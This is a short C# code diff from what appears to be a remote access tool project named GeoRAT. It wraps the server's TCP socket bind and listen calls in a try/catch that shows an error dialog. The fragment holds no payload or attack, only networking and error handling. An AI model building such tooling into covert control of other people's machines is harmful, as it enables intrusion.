@@ -36,11 +36,19 @@ namespace GeoRAT.Server.Net
         /// 
         public NetworkServer(string IP, int PORT)
         {
-            this.IP = IP;
-            this.PORT = PORT;
-            ServerSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-            ServerSocket.Bind(new IPEndPoint(IPAddress.Parse(IP), PORT));
-            ServerSocket.Listen(200);
+            try
+            {
+                this.IP = IP;
+
+                this.PORT = PORT;
+                ServerSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                ServerSocket.Bind(new IPEndPoint(IPAddress.Parse(IP), PORT));
+                ServerSocket.Listen(200);
+            }
+            catch (Exception e)
+            {
+                MessageBox.Show(e.Message, "Something went wrong", MessageBoxButtons.OK, MessageBoxIcon.Error); 
+            }
 
         }
 
